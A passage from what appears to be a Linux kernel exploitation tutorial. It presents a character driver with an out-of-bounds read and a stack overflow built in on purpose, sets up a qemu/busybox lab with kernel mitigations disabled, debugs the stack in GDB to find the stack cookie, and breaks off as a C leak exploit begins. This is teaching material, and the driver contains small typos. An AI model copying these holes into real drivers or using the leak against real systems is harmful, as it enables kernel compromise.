+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/kernel.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/fs.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/uaccess.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/device.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/cdev.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/init.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#define NAME &#34;vuln&#34;
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="n">major_number</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="k">struct</span> <span class="n">class</span> <span class="o">*</span><span class="n">cls</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">vulnz</span><span class="p">[</span><span class="mh">0xff</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="n">ssize_t</span> <span class="nf">vuln_read</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="p">,</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="p">,</span> <span class="n">size_t</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="n">ssize_t</span> <span class="nf">vuln_write</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="p">,</span><span class="k">const</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="p">,</span> <span class="n">size_t</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">vuln_open</span><span class="p">(</span><span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">vuln_close</span><span class="p">(</span><span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="k">struct</span> <span class="n">file_operations</span> <span class="n">fops</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">owner</span> <span class="o">=</span> <span class="n">THIS_MODULE</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">read</span> <span class="o">=</span> <span class="n">vuln_read</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">write</span> <span class="o">=</span> <span class="n">vuln_write</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">release</span> <span class="o">=</span> <span class="n">vuln_close</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">open</span> <span class="o">=</span> <span class="n">vuln_open</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="n">ssize_t</span> <span class="nf">vuln_read</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span> <span class="n">buff</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">count</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">off</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="n">buffer</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x4141414141414141</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">buffer</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x4242424242424242</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">buffer</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x4343434343434343</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">memcpy</span><span class="p">(</span><span class="n">vulnz</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">*</span><span class="n">off</span><span class="p">)</span> <span class="o">*</span><span class="n">off</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">copy_to_user</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span> <span class="n">vulnz</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span> <span class="c1">//OOB read
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">count</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="n">ssize_t</span> <span class="nf">vuln_write</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="n">buff</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">count</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">off</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">copy_from_user</span><span class="p">(</span><span class="n">vulnz</span><span class="p">,</span> <span class="n">buff</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span> <span class="c1">//stack overflowz
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">memcpy</span><span class="p">(</span><span class="n">vulnz</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">printk</span><span class="p">(</span><span class="n">KER_INFO</span><span class="p">,</span> <span class="s">&#34;%s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">count</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">vuln_open</span><span class="p">(</span><span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">i</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">fp</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">vuln_close</span><span class="p">(</span><span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">i</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">fp</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">init_module</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="n">major_number</span> <span class="o">=</span> <span class="n">register_chrdev</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">NAME</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">fops</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">major_number</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">                <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">&#34;chardevice registration error</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">major_number</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">cls</span> <span class="o">=</span> <span class="n">class_create</span><span class="p">(</span><span class="n">THIS_MODULE</span><span class="p">,</span> <span class="n">NAME</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">device_create</span><span class="p">(</span><span class="n">cls</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">MKDEV</span><span class="p">(</span><span class="n">major_number</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">NAME</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">&#34;Device create @ /dev/%s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">NAME</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">cleanup_module</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="n">device_destroy</span><span class="p">(</span><span class="n">cls</span><span class="p">,</span> <span class="n">MKDEV</span><span class="p">(</span><span class="n">major_number</span><span class="p">,</span> <span class="mi">0</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="n">class_destroy</span><span class="p">(</span><span class="n">cls</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">&#34;driver unregistered</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">MODULE_LICENSE</span><span class="p">(</span><span class="s">&#34;GPL&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">MODULE_AUTHOR</span><span class="p">(</span><span class="s">&#34;Binarychunk &lt;binarychunk@proton.me&gt;&#34;</span><span class="p">);</span>
+</span></span></code></pre></div><p>From the above source code, the driver introduces an <code>Out-Of-Bounds</code> read vulnerability via the <code>vuln_read</code> function; since we can read values from the stack without any bounds check/limit.</p>
+<p>It is also vulnerable to a <strong>stack overflow</strong> bug since there are no any bound checks when values are written/copied to the stack in the <code>vuln_write</code> function.</p>
+<p>First, we need to compile the above source code and load it into the kernel to create and register an interface for the driver at <code>/dev/vuln</code> that can be used to interact with that Kernel Driver.</p>
+
+  
+
+
+
+<div
+  
+    class="flex px-4 py-3 rounded-md bg-primary-100 dark:bg-primary-900"
+  >
+
+  <span
+    
+      class="text-primary-400 ltr:pr-3 rtl:pl-3 flex items-center"
+    >
+
+    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M506.3 417l-213.3-364c-16.33-28-57.54-28-73.98 0l-213.2 364C-10.59 444.9 9.849 480 42.74 480h426.6C502.1 480 522.6 445 506.3 417zM232 168c0-13.25 10.75-24 24-24S280 154.8 280 168v128c0 13.25-10.75 24-23.1 24S232 309.3 232 296V168zM256 416c-17.36 0-31.44-14.08-31.44-31.44c0-17.36 14.07-31.44 31.44-31.44s31.44 14.08 31.44 31.44C287.4 401.9 273.4 416 256 416z"/></svg>
+
+  </span>
+
+
+  </span>
+
+  <span
+    
+      class="dark:text-neutral-300"
+    >During compilation, ignore some of the warningz!</span>
+</div>
+
+<p>The below <code>Makefile</code> can be used to compile the above code into a loadable Kernel Object <code>.ko</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-make" data-lang="make"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">obj-m</span> <span class="o">+=</span> vuln
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">all</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">	make -C ./linux-5.4 <span class="nv">M</span><span class="o">=</span><span class="k">$(</span>PWD<span class="k">)</span> modules
+</span></span><span class="line"><span class="cl"><span class="nf">clean</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">	make -C ./linux-5.4 <span class="nv">M</span><span class="o">=</span><span class="k">$(</span>PWD<span class="k">)</span> clean
+</span></span></code></pre></div><p>Running the <code>make</code> command will build the driver with different other files but the most important file is <code>vuln.ko</code>.</p>
+<div id="file-system" class="anchor"></div>
+<h2 class="relative group">File System 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#file-system" aria-label="Anchor">#</a></span>        
+    
+</h2>
+<p>As the saying goes <em>&ldquo;Everything in Linux is a File&rdquo;</em>, therefore to be able to run our Kernel in an emulated enviroment, we need to create a file system for it. This should follow the default linux file system structure i.e <em>etc,sys, etc&hellip;</em></p>
+<p>To create a filesystem that will not take much space on disk because of library dependencies and all, we will be using <code>busybox</code> <em>(A software suite that provides several unix utilities in a single executable file)</em>.</p>
+<p>There are ofcourse, other ways that can be used to build the file system e.g <em>initramfs</em>. The following <a href="https://github.com/mutur4/Linux-Kernel-Build-Scripts/blob/main/fs-build.sh"   target="_blank">
+    script</a> again a fork for the above mentioned script can be used to build the file-system.</p>
+<p>The above bash script will first download <code>buysbox</code> from its download site and compiles it. A parent directory <code>rootfs</code> will be created with other subdirectories The new compile busybox binary will be copied here.</p>
+
+  
+
+
+
+<div
+  
+    class="flex px-4 py-3 rounded-md bg-primary-100 dark:bg-primary-900"
+  >
+
+  <span
+    
+      class="text-primary-400 ltr:pr-3 rtl:pl-3 flex items-center"
+    >
+
+    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M506.3 417l-213.3-364c-16.33-28-57.54-28-73.98 0l-213.2 364C-10.59 444.9 9.849 480 42.74 480h426.6C502.1 480 522.6 445 506.3 417zM232 168c0-13.25 10.75-24 24-24S280 154.8 280 168v128c0 13.25-10.75 24-23.1 24S232 309.3 232 296V168zM256 416c-17.36 0-31.44-14.08-31.44-31.44c0-17.36 14.07-31.44 31.44-31.44s31.44 14.08 31.44 31.44C287.4 401.9 273.4 416 256 416z"/></svg>
+
+  </span>
+
+
+  </span>
+
+  <span
+    
+      class="dark:text-neutral-300"
+    >When running the above script use the command <code>bash ./&lt;script-name&gt;</code> this is necessary since <code>mkdir -p {}</code> is native only to <code>bash</code>.</span>
+</div>
+
+<div id="passwd" class="anchor"></div>
+<h3 class="relative group">Passwd 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#passwd" aria-label="Anchor">#</a></span>        
+    
+</h3>
+<p>The next option is populating the <code>/etc/passwd</code> file, since this is where users and user ID&rsquo;s are checked, we will be populating it with both the <code>root</code> and <code>ffs</code> users as shown below.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="nl">root</span><span class="p">:</span><span class="nl">x</span><span class="p">:</span><span class="mi">0</span><span class="o">:</span><span class="mi">0</span><span class="o">:</span><span class="nl">root</span><span class="p">:</span><span class="o">/</span><span class="nl">root</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span>
+</span></span><span class="line"><span class="cl"><span class="nl">ffs</span><span class="p">:</span><span class="nl">x</span><span class="p">:</span><span class="mi">1000</span><span class="o">:</span><span class="mi">1000</span><span class="o">:</span><span class="nl">ctf</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="nl">ffs</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span>
+</span></span></code></pre></div><div id="init-scripts" class="anchor"></div>
+<h3 class="relative group">Init Scripts 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#init-scripts" aria-label="Anchor">#</a></span>        
+    
+</h3>
+<p>When a Linux system first boots, the <strong>boot loader</strong> will first load the Kernel Image. When it&rsquo;s loaded successfully, it will intialize all the Kernel specific structures and tasks and finally start the <code>init</code> process that will be assigned a <code>PID</code> of <code>1</code>.</p>
+<p>First, we will create a symlink to <code>rootfs/bin/busybox</code> called <code>init</code> at the <code>./rootfs/init</code> directory that will be executed to intiate and start the <code>init</code> process. When the <code>init</code> process is executed it does not make decisions by itself but will require a set of configuration(s) that specify what actions will need to be taken and this is where <code>init scripts</code> come in.</p>
+<p>These various scripts are stored in the <code>/etc/init.d</code> directory and the order in which these scripts are executed is specified in <code>/etc/inittab</code>. The format of this file/script is beyond the scope of this post but more can be read from <a href="https://www.ibm.com/docs/en/zos/2.3.0?topic=etcinittab-format-file"   target="_blank">
+    here</a>.</p>
+<p>The content of the <code>rootfs/etc/inittab</code> should be updated with the following:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">::sysinit:/etc/init.d/rCs
+</span></span><span class="line"><span class="cl">::once:sh -c <span class="s1">&#39;sleep 1; setuidguid 0 sh; poweroff&#39;</span>
+</span></span></code></pre></div><p>The first entry above will order the <code>init</code> process to execute the <code>rCs</code> script whose content is as specified below. The second entry simply executes the provided <code>sh</code> command to open a shell session with the provided <code>uid</code> and will <code>poweroff</code> when the shell session is terminated via the <code>exit</code> command.</p>
+<p>The content of the <code>./etc/init.d/rCs</code> file should be as follows and the file permissions should also be updated to make it executable.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#! /bin/sh 
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl">/bin/busybox --install -s 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">stty raw -echo
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">chown -R 0:0 / 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Mount important files</span>
+</span></span><span class="line"><span class="cl">mkdir -p /proc <span class="o">&amp;&amp;</span> mount -t proc none /proc
+</span></span><span class="line"><span class="cl">mkdir -p /dev <span class="o">&amp;&amp;</span> mount -t devtmpfs devtmpfs /dev
+</span></span><span class="line"><span class="cl">mkdir -p /tmp <span class="o">&amp;&amp;</span> mount -t tmpfs tmpfs /tmp
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">cat <span class="s">&lt;&lt; EOF 
+</span></span></span><span class="line"><span class="cl"><span class="s">Welcome to the Linux Kernel Stack Anatomyz!!!
+</span></span></span><span class="line"><span class="cl"><span class="s">EOF</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">chmod <span class="m">400</span> /proc/kallsyms
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#Load the driver </span>
+</span></span><span class="line"><span class="cl">insmod /vuln.ko
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#Make the driver interface readable</span>
+</span></span><span class="line"><span class="cl">chmod <span class="m">660</span> /dev/vuln
+</span></span></code></pre></div><p>The above script will mount specific and important files like <code>/proc</code> and <code>/dev</code> and simply loads/inserts our driver into the Kernel via the <code>insmod</code> command. With the file system now set up, we need to archive its content and finally launch the Kernel via <code>qemu</code>.</p>
+<p>The root-filesystem <em>(used for building our filesystem)</em> should be as follows:</p>
+<p>
+
+
+
+
+  <figure>
+    <img class="my-0 rounded-md" src="https://i.imgur.com/OKzmswD.png" alt="File Structure" />
+    
+  </figure>
+
+</p>
+<p>The following command can finally be used to archive this filesystem into a <code>cpio.gz</code>:</p>
+<pre tabindex="0"><code>pushd rootfs 
+find . -print0 | cpio --null -ov --format=newc | gzip -9 &gt; ../roofs.cpio.gz
+popd
+</code></pre><p>The following bash command will launch <code>qemu</code> with options used to pass the file system and the <code>Kernel Bootable Image</code>. This should best be run as a bash script since we will need to run it multiple times.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#! /usr/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl">/usr/bin/qemu-system-x86_64 <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>        -m 128M <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>        -cpu kvm64,+smep,+smap <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>        -no-reboot <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>        -kernel linux-5.4/arch/x86/boot/bzImage <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>        -initrd <span class="nv">$PWD</span>/rootfs.cpio.gz <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>        -nographic <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>        -monitor /dev/null <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>        -snapshot <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>        -s <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>        -append <span class="s2">&#34;console=ttyS0 nokaslr nopti nosmep nosmap panic=1&#34;</span>
+</span></span></code></pre></div><p>The most important <code>qemu</code> command line option that allows us to run and debug the Kernel is the <code>-s</code> options. This opens up the port <code>1234</code> that allows for remote debugging using <code>GDB</code>. The rest of the command options can be examined by running the <code>help</code> command.</p>
+<p>With the debug enviroment setup, we can now debug the kernel to examine the structure of the stack in memory.</p>
+<div id="debugging" class="anchor"></div>
+<h2 class="relative group">Debugging 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#debugging" aria-label="Anchor">#</a></span>        
+    
+</h2>
+<p>Once the above command is run, the lab should be okay and this should start up <code>qemu</code> and return a shell session as shown below.</p>
+<p>The device driver was loaded successfuly into the Kernal, and can be accessed from <code>/dev/vuln</code> with permissions that allow for read and write.</p>
+<p>
+
+
+
+
+  <figure>
+    <img class="my-0 rounded-md" src="https://i.imgur.com/ItiRmQx.png" alt="/dev/vuln" />
+    
+  </figure>
+
+</p>
+<p>As stated above, the Kernel can now be debugged via the <code>1234</code> open port. It&rsquo;s now time to start the debugger and examine the structure of the stack in memory. The debugger can be started and the following <code>GDB</code> commands run.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set</span> disassembly intel
+</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set</span> pagination off
+</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> target remote localhost:1234
+</span></span></code></pre></div><p>The last command will simply start remote debugging by initiating a <code>SIGTRAP</code> signal sending an interrupt to the Kernel, therefore, running shell commands on <code>qemu</code> will simply be halted until execution is continued from the debugger.</p>
+<p>Since <code>KASLR</code> was disabled during reboot, all the symbols and addresses that were loaded in the Kernel can be read from <code>/proc/kallsyms</code>, this includes functions that were defined in our vulnerable driver.</p>
+<p>For example the address of the <code>vuln_read</code> function can be obtained by running the following command:</p>
+<pre tabindex="0"><code>cat /proc/kallsyms | grep -i vuln_read
+</code></pre><p>The address of <em>vuln_read</em> should be returned as shown below.</p>
+<p>
+
+
+
+
+  <figure>
+    <img class="my-0 rounded-md" src="https://i.imgur.com/Saa51wQ.png" alt="vuln_read" />
+    
+  </figure>
+
+</p>
+<p>From the debugger, the address returned above can be used to disassemble the function allowing us set a break-point right after <strong><em>copy_to_user()</em></strong> is called for further analysis.</p>
+<p>The following <code>GDB</code> command will return <code>30</code> instructions from the address returned above.</p>
+<p>
+
+
+
+
+  <figure>
+    <img class="my-0 rounded-md" src="https://i.imgur.com/XbwRWvD.png" alt="vuln_read disassemble" />
+    
+  </figure>
+
+</p>
+<p>From the above disassembly, we can also see that before <code>memcpy()</code> the Kernel checks if the length provided by the user is greater than <code>0xff</code> <em>(marked in blue)</em> to which this will jump to some other address possibly an instruction that will throw a Kernel Panic.</p>
+<p>The second <code>call</code> instruction is exactly where the call to <code>copy_to_user</code> is called and a breakpoint can be set a this position using the following command:</p>
+<pre tabindex="0"><code>(gdb) br *0xffffffffc000008f
+</code></pre><p>From <code>qemu</code> the above break-point can be triggered by reading from the device driver.</p>
+<pre tabindex="0"><code>cat /dev/vuln
+</code></pre><p>When the breakpoint is hit, the following is the stack structure allocated to the <em>vuln_read()</em> function.</p>
+<p>
+
+
+
+
+  <figure>
+    <img class="my-0 rounded-md" src="https://i.imgur.com/s6IXZ63.png" alt="stack" />
+    
+  </figure>
+
+</p>
+<p>From the above stack, the value marked in <code>red</code> is the buffer allocated on the stack for the <code>buffer</code> variable and right next to this buffer, is the stack-cookie.</p>
+<p>One of the vulnerabilities introduced in the <em>vuln_read()</em> function, is a <code>OOB</code> read vulnerability. This is because the length provided by an attacker is what will be read from the stack. This therefore allows us to leak the stack-cookie to bypass the stack-cookie mitigation implemented.</p>
+<p>A <code>C</code> exploit script will be used throughout this post to build the exploit, with the following code snippet.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#define FILE &#34;/dev/vuln&#34;
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint64_t</span> <span class="n">leak</span><span class="p">[</span><span class="n">size</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">FILE</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
